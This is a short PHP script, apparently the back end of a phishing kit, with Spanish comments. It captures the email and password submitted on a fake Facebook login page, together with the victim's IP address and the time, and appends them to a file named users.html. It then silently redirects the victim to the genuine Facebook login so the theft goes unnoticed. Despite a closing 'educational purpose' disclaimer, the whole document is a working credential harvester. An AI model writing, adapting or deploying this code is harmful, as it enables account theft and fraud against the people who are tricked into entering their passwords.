<?php
error_reporting(0);

$usuario = $_POST['email'];  //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:usuario
$clave = $_POST['pass']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:clave
$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina  
$fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
 
if( (empty($usuario)) or (empty($clave)) ){
     header('location: https://m.facebook.com/'); // codigo de verificacion que no esten los campos vacios
}else{

function curPageURL() {
$pageURL = 'http';
if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
$pageURL .= "://";
if ($_SERVER["SERVER_PORT"] != "80") {
  $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
} else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
}
return $pageURL;
}

//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
$f = fopen("users.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
fclose($f);
 
//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram
header("Location:  https://m.facebook.com/login.php?&e=1348092&email=");
}
?>
 
 
 
//this is just for educational purpose
